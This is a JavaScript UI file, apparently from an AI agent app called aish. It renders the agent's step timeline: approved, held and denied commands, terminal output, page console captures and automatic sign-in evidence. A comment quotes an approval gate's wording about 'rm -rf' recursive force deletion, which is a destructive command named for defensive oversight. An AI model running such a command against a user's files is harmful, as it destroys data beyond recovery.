// successful automatic sign-in rendered covered in console blocks. A clean
// step draws nothing; the lines stay on the record and `aish explain` reads
// them back unconditionally, because a dossier is opened on purpose.
function consoleWanted(step) {
  return step.ok === false
    || !!step.problem
    || !!step.unchanged
    || !!(step.covered && step.covered.by && !step.covered.dismissed);
}

// aish's own sentence that this action could not be carried out as asked —
// the step's `problem`, verbatim. It is what explains why a console follows on
// a row whose tool-level status still reads ok (a browse whose action failed
// still returns a page). Set as text: it quotes page-authored names inside it.
// Skipped when a covered block is drawn — COVERED_STUCK and the cover are the
// same fact worded twice, and the cover's wording is the owner's.
function problemBlock(problem) {
  const box = document.createElement("div");
  box.className = "step-sub step-problem";
  box.textContent = String(problem);
  return box;
}

// The action's delta against the page last shown came back empty. A fact and
// not a failure — a press that legitimately changes nothing also records it —
// worded to exactly what the writer computed.
function unchangedBlock() {
  const box = document.createElement("div");
  box.className = "step-sub step-unchanged";
  box.textContent = "nothing on the page changed when aish did this";
  return box;
}

// The page's own console during this action (errors, warnings and uncaught
// exceptions). The heading is not decoration: these are the PAGE's words, and
// a block of monospace under an aish row would otherwise read as aish
// reporting on itself. It is drawn as text and never as markup — the residual
// attack is a page writing something that looks like part of the app.
function consoleBlock(lines, whose) {
  const box = document.createElement("div");
  box.className = "step-console";
  const head = document.createElement("div");
  head.className = "step-console-head";
  head.textContent = `${whose} wrote this to its own console — the page's words, not aish's`;
  box.appendChild(head);
  for (const line of lines) {
    const row = document.createElement("div");
    row.className = "step-console-line mono";
    row.textContent = String(line);
    box.appendChild(row);
  }
  return box;
}

// What was found SITTING ON TOP of the control this step pressed (#321).
//
// Not a console block and deliberately not drawn as one: a press that never
// landed writes nothing to a console, because no handler ran — this is aish's
// own observation about its own hands, and it is the line that explains the
// silence rather than another entry in it. The element's name is the PAGE's
// word for itself, so it is quoted, and it is set as text and never as markup.
//
// Worded to the CLICK and no wider. Nothing here knows whether a rung below
// the click then got the press through; the row's own status and notice say
// that, and a caption implying the action failed would be a claim this field
// cannot make.
function coveredBlock(covered) {
  if (!covered || !covered.by) return null;
  const box = document.createElement("div");
  box.className = "step-sub step-covered";
  const said = `a click could not land — the page had "${covered.by}" on top of the control`;
  box.textContent = covered.dismissed
    ? `${said} — aish dismissed it and clicked again`
    : said;
  return box;
}

// The sign-in aish made INSIDE this call, on a page of its own (#320). It is
// captured today and was rendered nowhere, so the owner went looking for it,
// could not find it, and went on reading a failed sign-in through somebody
// else.
//
// It is deliberately NOT hung on the step's `frame` key. That key claims "the
// page at the moment the model was SHOWN it", and the model is never shown the
// sign-in page — it is a different document the model did not ask for and
// cannot name. Borrowing the key would be a stated guarantee wider than the
// capture enforces, so this has its own, and says out loud which page it is.
//
// It says ATTEMPTED, and more only where the record does: `host` is written
// whenever a sign-in was TRIED, success or failure, and `ok` — written since
// the outcome joined the record — is `SignInResult.ok`, set only where the
// walled URL was read afresh and the session was seen to come up. A block
// without `ok` is an older log, and gets the attempt sentence alone; the
// renderer may not say more than the record does.
//
// The console follows the same surface-on-anomaly rule the step's own console
// does: a renewal that WORKED is the ordinary ending, and the owner's first
// successful one rendered covered in the login page's everyday errors. Not
// seen to come up (or unknown) still shows it — that is the failure the
// record was built for, and the eon.pl day it exists to end.
function signinEvidence(signin) {
  if (!signin || !signin.host) return null;
  const box = document.createElement("div");
  box.className = "step-signin";
  const head = document.createElement("div");
  head.className = "step-sub step-signin-head";
  const outcome = signin.ok === true ? " and the session came up"
    : signin.ok === false ? " and the session was not seen to come up" : "";
  head.textContent = `aish attempted an automatic sign-in at ${signin.host} during this step${outcome} — below is that page, not the one above`;
  box.appendChild(head);
  const shot = framePicture(signin.frame, `the sign-in page at ${signin.host}`);
  if (shot) {
    box.appendChild(shot);
  } else if (FRAME_ABSENT[signin.frame_skipped]) {
    const note = document.createElement("div");
    note.className = "step-sub step-frame-none";
    note.textContent = FRAME_ABSENT[signin.frame_skipped];
    box.appendChild(note);
  }
  const covered = coveredBlock(signin.covered ? { by: signin.covered } : null);
  if (covered) box.appendChild(covered);
  if (signin.console && signin.console.length && signin.ok !== true) {
    box.appendChild(consoleBlock(signin.console, "the sign-in page"));
  }
  return box;
}

function traceFrame(step) {
  const parts = [];
  const picture = framePicture(step.frame, "the page as aish read it");
  if (picture) {
    const where = frameWhere(step);
    if (where) picture.appendChild(where);
    parts.push(picture);
  } else if (!step.frame && FRAME_ABSENT[step.frame_skipped]) {
    const note = document.createElement("span");
    note.className = "step-sub step-frame-none";
    note.textContent = FRAME_ABSENT[step.frame_skipped];
    parts.push(note);
  }
  const cover = coveredBlock(step.covered);
  if (cover) parts.push(cover);
  if (step.problem && !cover) parts.push(problemBlock(step.problem));
  if (step.unchanged) parts.push(unchangedBlock());
  // Surfaced only on a step that recorded its own anomaly (consoleWanted);
  // the record itself is unconditional and `aish explain` reads all of it.
  if (step.console && step.console.length && consoleWanted(step)) {
    parts.push(consoleBlock(step.console, "the page"));
  }
  const signin = signinEvidence(step.signin);
  if (signin) parts.push(signin);
  // Nothing recorded, nothing drawn. A step that carries none of this — every
  // tool that never had a page, and every log written before any of it existed
  // — must not grow a row implying a capture was even considered.
  if (!parts.length) return null;
  if (parts.length === 1) return parts[0];
  const wrap = document.createElement("div");
  wrap.className = "step-evidence";
  for (const part of parts) wrap.appendChild(part);
  return wrap;
}
// [TRACE-FRAME-END]

function toolStart(t, step) {
  t.started += 1;
  const [title, iconKey] = TOOL_META[step.name] || [step.name, "dot", "--dim"];
  const ref = traceRow(t, SPINNER, title, step.name === "run_command" ? "" : step.summary);
  knowledgeTag(ref, step.name);
  ref.row.classList.add("running", "active-step");
  startStepTimer(t, ref);
  t.running.push({ name: step.name, summary: step.summary || "", command: step.command || "" });
  // The command + output + exit for run_command are drawn by the terminal
  // block that command_start builds once the command is approved and runs;
  // while the approval card is up the row is just the spinner.
  t.pending = { ...ref, name: step.name };
  updateTraceHead(t);
}

const STEP_FLASH_MS = 1400;

// The join between an action that was HELD and the one the model proposed next
// (#323). Approve-with-comment never runs what was on the card: it holds it and
// tells the model to re-propose, so without this the timeline read as two
// unrelated proposals with a dead row between them.
//
// The wording is the load-bearing part. `replaces` asserts exactly one thing —
// the first later call to the SAME tool while a hold was outstanding — so the
// row may say the ordering and nothing else. "Reworked from", "corrected
// version of" or "in response to your comment" would each state something no
// line of code checked; the held step's own command is what settles whether
// this one differs, which is why the sentence is a way BACK to it rather than a
// verdict about it. Neutral, never red: nothing here observed a problem.
function heldJoin(t, step) {
  if (!step.replaces) return null;
  const label = "Proposed after the held step";
  const target = t.heldRows && t.heldRows.get(step.replaces);
  if (!target) {
    // The held row is not in this card — a partial replay, or a log whose head
    // the first paint did not reach. A control that navigates nowhere reads as
    // broken (L7), so the fact is still stated and only the offer is dropped.
    const flat = document.createElement("span");
    flat.className = "step-after-held";
    flat.textContent = label;
    return flat;
  }
  const jump = document.createElement("button");
  jump.type = "button";
  jump.className = "step-after-held";
  const text = document.createElement("span");
  text.textContent = label;
  const chev = document.createElement("span");
  chev.className = "step-after-held-chev";
  chev.textContent = "›";
  jump.append(text, chev);
  jump.onclick = (e) => { if (e && e.stopPropagation) e.stopPropagation(); revealStep(target); };
  return jump;
}

// Bring a row that is already in this card into view, and say WHICH one.
// `block: "nearest"` means a row already on screen does not move at all: this
// is a hop of a few rows inside one card, not the long animated jump [EXPLAIN]
// rules out, and the flash is what answers "which of these did it land on".
function revealStep(row) {
  if (row.scrollIntoView) row.scrollIntoView({ block: "nearest", inline: "nearest" });
  row.classList.add("step-flash");
  setTimeout(() => row.classList.remove("step-flash"), STEP_FLASH_MS);
}

function toolFinish(t, step) {
  accountStepTime(t, step.secs);
  const meta = TOOL_META[step.name] || [step.name, "dot", "--dim"];
  const denied = step.decision === "denied" || step.decision === "blocked" || step.decision === "rejected";
  // Approve + comment holds the action for adjustment (#81): it did not run,
  // so it renders in the same "not executed" style as a denial, but amber and
  // labelled "Held" — it is a pause, not a failure.
  const held = step.decision === "held";
  const notRun = denied || held;
  let ref = t.pending && t.pending.name === step.name ? t.pending : null;
  if (!ref) {
    // No matching start (e.g. replay ordering): synthesize a completed row.
    t.started += 1;
    ref = traceRow(t, "", meta[0], step.name === "run_command" ? "" : step.summary);
    knowledgeTag(ref, step.name);
    if (step.name === "run_command" && step.command) {
      const cmd = document.createElement("div");
      cmd.className = "step-cmd mono";
      cmd.textContent = step.command;
      ref.main.appendChild(cmd);
    }
  }
  clearStepTimer(t, ref);
  t.pending = null;
  const runIdx = t.running.findIndex((r) => r.name === step.name);
  if (runIdx !== -1) t.running.splice(runIdx, 1);
  ref.row.classList.remove("running", "active-step");
  // finalize badge icon
  const iconName = held ? "command" : denied ? "denied" : step.name === "run_command" ? "command"
    : !step.ok ? "denied" : meta[1];
  const color = held ? "var(--orange)" : denied || !step.ok ? "var(--red)" : `var(${meta[2]})`;
  ref.badge.innerHTML = traceSvg(iconName, color);
  // status tag on the title
  const tag = document.createElement("span");
  tag.className = "step-tag " + (held ? "held" : denied || !step.ok ? "bad" : "ok");
  tag.textContent = held ? "Held — adjust"
    : denied ? (step.decision === "blocked" ? "Blocked" : "Denied")
    : !step.ok ? "Error"
    : step.name === "run_command" ? `${ref.manual ? "Approved" : "Auto-approved"} · ${fmtSecs(step.secs)}`
    : fmtSecs(step.secs);
  ref.titleEl.appendChild(tag);
  // Where this row came from (#323). Onto the TITLE, not the row body: the
  // body already holds the terminal block that command_start drew, so an
  // append lands the provenance of the action UNDER its output, arbitrarily
  // far from the row it is about. `.step-title` wraps, so it takes its own
  // line under the title on a phone and sits beside the tag when there is room.
  const after = heldJoin(t, step);
  if (after) ref.titleEl.appendChild(after);
  // …and, if this row IS a hold, the row a later one may point back at.
  if (held && step.call) t.heldRows.set(step.call, ref.row);
  // The user's approval note, shown back on the step (#3), clamped when long.
  // Not gated on the step name: since #323 every gate that refused or held
  // because of a sentence he typed carries it here, not just the writes.
  if (step.comment) ref.main.appendChild(clampNote(step.comment));
  if (notRun) {
    // A denied/blocked/held command never runs, so no terminal block is built
    // — show the command struck-through here with the reason it was skipped.
    if (step.name === "run_command" && step.command && !ref.row.querySelector(".step-cmd")) {
      const cmd = document.createElement("div");
      cmd.className = "step-cmd mono struck";
      cmd.textContent = step.command;
      ref.main.appendChild(cmd);
    }
    // A denied write/edit never reached disk — the diff shown on the approval
    // card was NOT applied. Say so plainly, mirroring the struck command above
    // so the timeline doesn't read the change as written (#67).
    if (step.name === "write_file" || step.name === "edit_file") {
      const skipped = document.createElement("span");
      skipped.className = "step-sub";
      skipped.textContent = "Change not applied";
      ref.main.appendChild(skipped);
    }
    // The reason, out of a log written BEFORE #323 — #5, #12. Back then
    // `output` meant what the command PRINTED on an approved step and what the
    // owner TYPED on a denied one, and from here the two are indistinguishable:
    // these logs also hold gate wording in this key ("rm -rf: recursive force
    // delete is unrecoverable"). So it keeps the neutral machine voice rather
    // than being promoted into his; a sentence attributed to the wrong speaker
    // is the defect #323 exists to end, not a cosmetic one.
    //
    // Since #323 his words arrive in `comment` — drawn above, in his voice —
    // and this key is empty on those rows, so nothing is drawn here at all.
    // Guarded on `comment` rather than on the empty string so a log carrying
    // both can never say it twice.
    if (step.output && !step.comment) {
      const why = document.createElement("span");
      why.className = "step-sub";
      why.textContent = step.output;
      ref.main.appendChild(why);
    }
  }
  // The diff of a file edit, shown inline in the timeline (#55): what was
  // written for an applied edit, or (dimmed, under "Change not applied") what
  // was proposed for a denied/held one. Reuses the approval card's renderer so
  // the styling matches, and works identically live and on cold replay since
  // the step carries the same diff the card computed.
  if ((step.name === "write_file" || step.name === "edit_file") && step.diff) {
    const d = renderDiff(step.diff);
    d.classList.add("step-diff");
    if (notRun) d.classList.add("not-applied");
    ref.main.appendChild(d);
  }
  // An executed run_command's output lives in the terminal block that
  // command_start/command_end drew and finalized — live AND on cold replay,
  // where reconstruct_events replays the same framing events. So there is
  // nothing to render here, and no framing-less fallback path to diverge.
  // error detail for a failed non-run_command tool (#18)
  if (!step.ok && step.error && step.name !== "run_command") {
    const errWrap = document.createElement("div");
    errWrap.className = "step-output";
    ref.main.appendChild(errWrap);
    renderErrorBox(errWrap, step.error);
  }
  // Last on the row, because it is the biggest thing on it and everything above
  // is what the step SAYS about itself. Pure function of the step, so a chat
  // redrawn from its log shows the same picture the live turn did (L2).
  const frame = traceFrame(step);
  if (frame) ref.main.appendChild(frame);
  updateTraceHead(t);
}

const WRAP_SVG = '<svg viewBox="0 0 24 24"><path d="M4 6.5h16M4 12h12a3.25 3.25 0 0 1 0 6.5h-2.5m0 0 2.2-2.2m-2.2 2.2 2.2 2.2M4 18.5h5.5" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"/></svg>';

// The collapsible command-output box: header (label · wrap · copy), a scrolling
// body, and a "Show full output · N lines" expander when it's tall.
function outBox(errorMode) {
  const box = document.createElement("div");
  box.className = "out-box" + (errorMode ? " error" : "");
  box.innerHTML =
    `<div class="out-head"><span class="out-label">${errorMode ? "error" : "output"}</span>` +
    `<div class="out-actions"><button type="button" class="out-wrap" title="Wrap lines">${WRAP_SVG}</button></div></div>` +
    `<div class="out-scroll"><div class="out-body mono"></div><div class="out-fade"></div></div>` +
    `<button type="button" class="out-expand" hidden></button>`;
  const body = box.querySelector(".out-body");
  box.querySelector(".out-wrap").onclick = () => box.classList.toggle("wrap-on");
  box.querySelector(".out-actions").prepend(copyChip(() => body.textContent, "copy output"));
  const scroll = box.querySelector(".out-scroll");
  box.querySelector(".out-expand").onclick = () => {
    box.classList.toggle("expanded"); labelExpand(box);
    requestAnimationFrame(() => updateScrollHints(scroll));
  };
  scroll.addEventListener("scroll", () => updateScrollHints(scroll));
  return box;
}

function outLines(box) {
  return (box.querySelector(".out-body").textContent.match(/\n/g) || []).length + 1;
}
function labelExpand(box) {
  box.querySelector(".out-expand").textContent =
    box.classList.contains("expanded") ? "Collapse output" : `Show full output · ${outLines(box)} lines`;
}
function finalizeOutBox(box, label) {
  if (label) box.querySelector(".out-label").textContent = label;
  if (outLines(box) > 6) { box.classList.add("collapsible"); box.querySelector(".out-expand").hidden = false; labelExpand(box); }
  requestAnimationFrame(() => updateScrollHints(box.querySelector(".out-scroll")));
}

// Peel a trailing "[exit code: N]" into the header label.
// A run_command approval note on the finished step: clamp long / multi-line
// text to a few lines with a Show more/less toggle, mirroring the output box's
// graceful handling instead of ellipsizing to a single line.
function clampNote(text) {
  const wrap = document.createElement("div");
  wrap.className = "step-note-wrap";
  const note = document.createElement("span");
  note.className = "step-sub step-note";
  // ATTRIBUTED, for the same reason the approval card's reason block says
  // "aish says": a trace row is aish's account of its own step, so an
  // unlabelled quote in the same dim italic as the machine sub-lines beside it
  // (a skipped frame's reason is italic too) reads as aish quoting itself —
  // which is the styling this issue was reported about. Earned rather than
  // assumed: `comment` is DEFINED as the sentence the owner typed on the
  // approval card, and no path writes anything else into it (trace contract
  // 3.4). A gate's own wording travels in other keys and is drawn in the
  // machine voice.
  const who = document.createElement("span");
  who.className = "step-note-who";
  who.textContent = "you said";
  note.append(who, document.createTextNode(`“${text}”`));
  wrap.appendChild(note);
  const more = document.createElement("button");
  more.type = "button";
  more.className = "note-more";
  more.textContent = "Show more";
  more.hidden = true;
  more.onclick = () => {
    const expanded = wrap.classList.toggle("expanded");
    more.textContent = expanded ? "Show less" : "Show more";
  };
  wrap.appendChild(more);
  requestAnimationFrame(() => {
    if (note.scrollHeight - note.clientHeight > 4) more.hidden = false;
  });
  return wrap;
}

function renderErrorBox(container, text) {
  container.replaceChildren();
  const box = outBox(true);
  box.querySelector(".out-body").appendChild(ansiFragment(text));
  container.appendChild(box);
  finalizeOutBox(box, "error");
}

// ---- terminal block (run_command) ---------------------------------------
// A single black terminal panel per executed command: a pinned prompt line
// (dir$ command), a rule, the ANSI output (capped with a "Show all" expander
// once tall), a rule, and a pinned exit-code line. command_start builds it,
// stream events fill the output live, command_end sets the exit label. The
// framing events are recorded, so a session replay reconstructs it identically.

const TERM_OUTPUT_CAP_VH = 40;

// Live DOM cap (issue #109): a command with tens of thousands of output lines
// would append one node + reflow per line, freezing the tab. Keep only the last
// N lines in the live terminal block; the full (truncated) result still arrives
// on the tool step. Each line is wrapped in its own `.tol` span so lines are
// cheap to count and trim regardless of the ANSI nodes inside them.
const TERM_LIVE_LINE_CAP = 800;

// The prompt-line directory, Starship [directory]-style: keep the last
// DIR_SEGMENTS path segments, prefixed with "…/" when anything was truncated
// (repo root is not special — truncate_to_repo=false). Home is shown as ~.
const DIR_SEGMENTS = 4;
function promptDir(cwd) {
  let p = (cwd || "").replace(/\/+$/, "");
  if (!p) return "/";
  if (homeDir && p === homeDir) return "~";
  if (homeDir && p.startsWith(homeDir + "/")) p = "~" + p.slice(homeDir.length);
  if (p === "/" || p === "~") return p;
  const home = p.startsWith("~");
  const segs = p.split("/").filter(Boolean);
  if (segs.length <= DIR_SEGMENTS) return home ? segs.join("/") : "/" + segs.join("/");
  return "…/" + segs.slice(-DIR_SEGMENTS).join("/");
}

function termRule(cls) {
  const r = document.createElement("div");
  r.className = "term-rule " + cls;
  return r;
}

// A wrap toggle for a terminal zone: highlights while that zone is wrapped.
// `on` is the zone's default wrap state (command wraps by default, output
// doesn't), so the button's lit state always matches what the eye sees.
// Toggling wrap reflows the output height, so anchor `anchorSel`'s top to the
// same viewport position afterward — the content you were looking at stays put
// instead of jumping — and re-measure the cap for the new line count.
function termWrapBtn(block, anchorSel, toggle, on) {
  const b = document.createElement("button");
  b.type = "button";
  b.className = "term-tool term-wrap" + (on ? " on" : "");
  b.title = "Wrap lines";
  b.innerHTML = WRAP_SVG;
  b.onclick = () => {
    const anchor = block.querySelector(anchorSel);
    const before = anchor ? anchor.getBoundingClientRect().top : 0;
    b.classList.toggle("on");
    toggle();
    recomputeTermCap(block);
    if (anchor) messagesEl.scrollTop += anchor.getBoundingClientRect().top - before;
  };
  return b;
}

// The global top-bar wrap toggle overrides every command block: force each
// block's output wrap (and its button's lit state) to the global value, then
// re-cap for the new line count. New blocks seed from the same global value at
// build time; a per-block toggle diverges until the next global change.
function syncTermWrap(on) {
  for (const block of document.querySelectorAll(".term-block")) {
    block.classList.toggle("term-owrap", on);
    const btn = block.querySelector(".term-out-wrap .term-wrap");
    if (btn) btn.classList.toggle("on", on);
    recomputeTermCap(block);
  }
}

// The global top-bar wrap toggle also overrides every diff card: force each
// diff's soft-wrap and its button's lit state to the global value. New diffs
// seed from the same global value at build time; a per-card toggle diverges
// until the next global change (same contract as syncTermWrap).
function syncDiffWrap(on) {
  for (const diff of document.querySelectorAll(".diff")) {
    diff.classList.toggle("diff-soft", on);
    const btn = diff.parentElement && diff.parentElement.querySelector(".diff-wrap-btn");
    if (btn) btn.classList.toggle("on", on);
  }
}

// (Re)decide whether the output needs the "Show all" cap for its current
// height — used at command_end and after a wrap toggle changes the line count.
function recomputeTermCap(block) {
  if (block.classList.contains("expanded")) return;
  const out = block.querySelector(".term-out");
  const hasOutput = out.textContent.trim() !== "";
  const cap = (window.innerHeight * TERM_OUTPUT_CAP_VH) / 100;
  block.classList.toggle("capped", hasOutput && out.scrollHeight > cap + 12);
}

function buildTermBlock(cwd, command) {
  const block = document.createElement("div");
  block.className = "term-block running";

  // The prompt line scrolls horizontally in nowrap mode; its tools live on the
  // non-scrolling wrapper so they stay pinned top-right instead of sliding away.
  const promptWrap = document.createElement("div");
  promptWrap.className = "term-prompt-wrap";
  const prompt = document.createElement("div");
  prompt.className = "term-prompt mono";
  const dir = document.createElement("span");
  dir.className = "term-dir";
  dir.textContent = promptDir(cwd);
  dir.title = cwd || "";
  const dollar = document.createElement("span");
  dollar.className = "term-dollar";
  dollar.textContent = "$";
  const cmd = document.createElement("span");
  cmd.className = "term-cmd";
  cmd.textContent = command || "";
  prompt.append(dir, dollar, cmd);
  // Command tools: copy grabs the COMMAND only (no dir/$ prompt); wrap toggles
  // the prompt line between wrapping and single-line horizontal scroll.
  const cmdTools = document.createElement("div");
  cmdTools.className = "term-tools";
  cmdTools.append(
    termWrapBtn(block, ".term-prompt", () => block.classList.toggle("term-cnowrap"), true),
    copyChip(() => cmd.textContent, "copy command"),
  );
  promptWrap.append(prompt, cmdTools);

  const outWrap = document.createElement("div");
  outWrap.className = "term-out-wrap";
  const out = document.createElement("div");
  out.className = "term-out mono";
  const fade = document.createElement("div");
  fade.className = "term-fade";
  // Output tools: copy grabs the OUTPUT only (the two rules reinforce that the
  // prompt line and exit code aren't part of it); wrap soft-wraps the output.
  // Seed the wrap state from the global top-bar wrap preference, but the
  // per-block toggle then owns it independently (the term block ignores the
  // global body.wrap so this button can always override it).
  const outWrapped = document.body.classList.contains("wrap");
  if (outWrapped) block.classList.add("term-owrap");
  const outTools = document.createElement("div");
  outTools.className = "term-tools";
  outTools.append(
    termWrapBtn(block, ".term-out", () => block.classList.toggle("term-owrap"), outWrapped),
    copyChip(() => out.textContent, "copy output"),
  );
  outWrap.append(outTools, out, fade);

  const showall = document.createElement("button");
  showall.type = "button";
  showall.className = "term-showall";
  showall.textContent = "Show all output";
  showall.onclick = () => {
    const on = block.classList.toggle("expanded");
    showall.textContent = on ? "Show less" : "Show all output";
  };

  const exit = document.createElement("div");
  exit.className = "term-exit mono";
  const label = document.createElement("span");
  label.className = "term-exit-label";
  label.innerHTML = SPINNER + '<span class="term-exit-cap">running</span>';
  exit.appendChild(label);

  block.append(promptWrap, termRule("term-rule-top"), outWrap, showall,
    termRule("term-rule-bot"), exit);
  return block;
}

// A user-typed ! command runs directly (not model work), so its terminal block
// renders inline in the transcript rather than inside the activity trace. This
// holds that standalone block while its output streams (#51 follow-up).
let userCmdBlock = null;

function onCommandStart(event) {
  const block = buildTermBlock(event.cwd, event.command);
  if (event.user) {
    // Direct user command: stand it in the main chat, no trace wrapper, and
    // expanded by default — the user ran it and wants to see the whole outcome
    // to decide what's next, not a capped "Show all output" preview.
    block.classList.add("expanded");
    messagesEl.appendChild(block);
    userCmdBlock = block;
    scrollToEnd();
    return;
  }
  const t = ensureTrace();
  const pending = t.pending && t.pending.name === "run_command" ? t.pending : null;
  if (pending) {
    pending.main.appendChild(block);
    pending.term = block;
  } else {
    // No matching run_command row (unusual replay ordering): synthesize one.
    const ref = traceRow(t, traceSvg("command", "var(--green)"), "run_command", "");
    ref.main.appendChild(block);
    t.pending = { ...ref, name: "run_command", term: block };
  }
  scrollToEnd();
  pinTrace(t);
}

function onCommandEnd(event) {
  const block = userCmdBlock || (currentTrace && currentTrace.pending && currentTrace.pending.term);
  if (block) finalizeTermBlock(block, event);
  userCmdBlock = null;
}

function finalizeTermBlock(block, event) {
  block.classList.remove("running");
  const out = block.querySelector(".term-out");
  const hasOutput = out.textContent.trim() !== "";
  if (!hasOutput) block.classList.add("no-output"); // collapse the middle zone

  // A dim uppercase caption + a colored value, so the status line never reads
  // like part of the command (the old bare "exit 0" did). ok/bad color the
  // value only.
  const label = block.querySelector(".term-exit-label");
  let cls, cap, val;
  if (event.status === "detached") {
    cls = "detached"; cap = "job"; val = event.job ? `pid ${event.job}` : "detached";
  } else if (event.status === "interrupted") {
    cls = "bad"; cap = "status"; val = "interrupted";
  } else if (typeof event.exit_code === "number") {
    cls = event.exit_code === 0 ? "ok" : "bad"; cap = "exit code"; val = String(event.exit_code);
  } else {
    cls = "bad"; cap = "status"; val = "error"; // e.g. the command never started
  }
  label.className = "term-exit-label";
  label.replaceChildren();
  const capEl = document.createElement("span");
  capEl.className = "term-exit-cap";
  capEl.textContent = cap;
  const valEl = document.createElement("span");
  valEl.className = "term-exit-val " + cls;
  valEl.textContent = val;
  label.append(capEl, valEl);

  // Cap tall output with a "Show all" expander instead of an inner scroll
  // region — expanding flows into the page's own scroll (iOS-safe). Measured
  // synchronously here, not in a rAF: command_end is processed just before the
  // turn's "done" collapses the trace (display:none), which would zero out
  // scrollHeight and defeat the check.
  recomputeTermCap(block);
}

function traceStream(text) {
  // While a run_command is live, its output streams into the terminal block
  // command_start built — the standalone user-command block if one is live,
  // else the model's trace block; otherwise (no active block) it renders inline.
  const term = userCmdBlock || (currentTrace && currentTrace.pending && currentTrace.pending.term);
  if (term) {
    appendTermLines(term.querySelector(".term-out"), text);
    term.classList.add("has-output");
    // Coalesce scroll+pin to one per frame (issue #109): N stream events in a
    // single tick otherwise trigger N layout reflows.
    scheduleStreamRender(currentTrace);
    return;
  }
  addStreamLine(text);
}

// Append output to a terminal block, one `.tol` span per line, and enforce the
// live DOM cap. The backend coalesces lines, so `text` may carry several joined
// by '\n' (cold replay hands the whole truncated output as one chunk) — split
// so trimming stays line-accurate either way.
function appendTermLines(body, text) {
  for (const line of text.split("\n")) {
    if (body.childNodes.length) body.appendChild(document.createTextNode("\n"));
    const tol = document.createElement("span");
    tol.className = "tol";
    tol.appendChild(ansiFragment(line));
    body.appendChild(tol);
  }
  capTermLines(body);
}

function capTermLines(body) {
  const lines = body.querySelectorAll(".tol");
  const excess = lines.length - TERM_LIVE_LINE_CAP;
  if (excess <= 0) return;
  for (let i = 0; i < excess; i++) {
    const tol = lines[i];
    const nl = tol.nextSibling; // the "\n" text node that separated it
    tol.remove();
    if (nl && nl.nodeType === 3 && nl.textContent === "\n") nl.remove();
  }
  // One muted marker so the user knows output was dropped (the full truncated
  // result is on the tool step below). Prepended once, then kept at the top.
  if (!body.querySelector(".term-trim-note")) {
    const note = document.createElement("span");
    note.className = "term-trim-note a-dim";
    note.textContent = "… earlier output trimmed (see full result below) …";
    body.insertBefore(document.createTextNode("\n"), body.firstChild);
    body.insertBefore(note, body.firstChild);
  }
}

// One scroll + pin per animation frame no matter how many stream events land in
// the frame; slow output still autoscrolls (a lone event schedules its own rAF).
let streamRenderTrace = null;
let streamRenderScheduled = false;
function scheduleStreamRender(trace) {
  if (trace) streamRenderTrace = trace;
  if (streamRenderScheduled) return;
  streamRenderScheduled = true;
  requestAnimationFrame(() => {
    streamRenderScheduled = false;
    const trace = streamRenderTrace;
    streamRenderTrace = null;
    scrollToEnd();
    if (trace) pinTrace(trace);
  });
}

function mmss(sec) {
  const m = Math.floor(sec / 60);
  return `${m}:${String(sec % 60).padStart(2, "0")}`;
}

// [TRACE-STATUS-START]
// The live header's one-liner: what is happening RIGHT NOW, so a collapsed
// trace still tells the story. Pure derivation over the data the step handlers
// stash on `t` — all display strings are built here and nowhere else.
const TOOL_STATUS = {
  run_command: (r) => "Running: " + (r.command || r.summary || "a command"),
  read_file: (r) => "Reading " + (r.summary || "a file"),
  write_file: (r) => "Writing " + (r.summary || "a file"),
  edit_file: (r) => "Editing " + (r.summary || "a file"),
  read_url: (r) => "Reading " + (r.summary || "a page"),
  web_search: (r) => "Searching: " + (r.summary || "…"),
  read_docs: (r) => "Reading docs: " + (r.summary || "…"),
  read_skill: (r) => "Reading skill: " + (r.summary || "…"),
  recall: (r) => "Recalling: " + (r.summary || "…"),
  remember: (r) => "Saving to memory: " + (r.summary || "…"),
  create_tool: () => "Creating a tool",
  import_skill: (r) => "Importing skill: " + (r.summary || "…"),
};

function toolStatusLine(r) {
  const build = TOOL_STATUS[r.name];
  if (build) return build(r);
  return "Running " + r.name + (r.summary ? ": " + r.summary : "");
}

function traceStatusLine(t) {
  if (t.stopping) return "Stopping…";
  if (t.waitingApproval) return "Waiting for approval…";
  if (t.answering) return "Answering…";
  if (t.running.length) {
    // Model words describe the whole turn; without them, name the newest
    // in-flight tool (read-only tools run in parallel — count the rest).
    const words = t.turnSay || t.turnGist;
    const line = words || toolStatusLine(t.running[t.running.length - 1]);
    const more = t.running.length - 1;
    return more > 0 ? `${line} · +${more} more` : line;
  }
  // The gist IS the status — no "Thinking:" label; the purple spinner and
  // the timeline row already say what phase this is.
  if (t.liveGist) return t.liveGist;
  if (t.thinkingRow) return "Thinking…";
  if (t.turnSay || t.turnGist) return t.turnSay || t.turnGist;
  return "Working…";
}
// [TRACE-STATUS-END]

function updateTraceHead(t) {
  const title = t.el.querySelector(".trace-title");
  const sub = t.el.querySelector(".trace-sub");
  const live = t.el.classList.contains("live");
  // Tokens ride the sub line, not a separate right-side chip — the status
  // line needs the full header width (a web-search query ellipsizes late,
  // not at a chip-squeezed midpoint).
  const parts = [];
  if (t.tokensIn) parts.push("↑" + fmtTokens(t.tokensIn));
  if (t.tokensOut) parts.push("↓" + fmtTokens(t.tokensOut));
  const tok = parts.join(" ");
  if (live) {
    title.textContent = traceStatusLine(t);
    const elapsed = Math.floor((Date.now() - t.startedAt) / 1000);
    // No step count while live — what is happening matters, not how many
    // steps it took so far.
    sub.textContent = mmss(elapsed) + (tok ? ` · ${tok}` : "");
    if (t.activeStartedAt) {
      const st = t.body.querySelector(".step.active-step .step-timer");
      if (st) st.textContent = `${Math.floor((Date.now() - t.activeStartedAt) / 1000)}s`;
    }
  } else if (!t.started) {
    // A turn that ran nothing: "Worked for 0.0s · 0 steps" reads as a broken
    // card. It answered, and its record is still worth opening.
    title.textContent = "Answered";
    sub.textContent = tok;
  } else {
    title.textContent = `Worked for ${fmtSecs(t.secs)}`;
    sub.textContent = `${t.started} step${t.started === 1 ? "" : "s"}` + (tok ? ` · ${tok}` : "");
  }
}

// The answer streamed into this (formerly "Thinking…") row — finalize it as a
// permanent "Answered" step instead of dropping the live row, so the last step
// on the timeline reflects that the reply landed.
function finalizeAnswerRow(t, ref, secs) {
  clearStepTimer(t, ref);
  ref.row.classList.remove("running", "active-step");
  ref.badge.innerHTML = traceSvg("check", "var(--green)");
  ref.titleEl.textContent =
    typeof secs === "number" ? `Answered in ${fmtSecs(secs)}` : "Answered";
}

// [TRACE-CLOSE-START]
// …and it ends HERE, whatever ends it: a finished turn, an error, a stop, or the
// replay that replaced the transcript it was drawn into (resetLiveTurn calls
// this rather than nulling the variable, so the interval timer and every
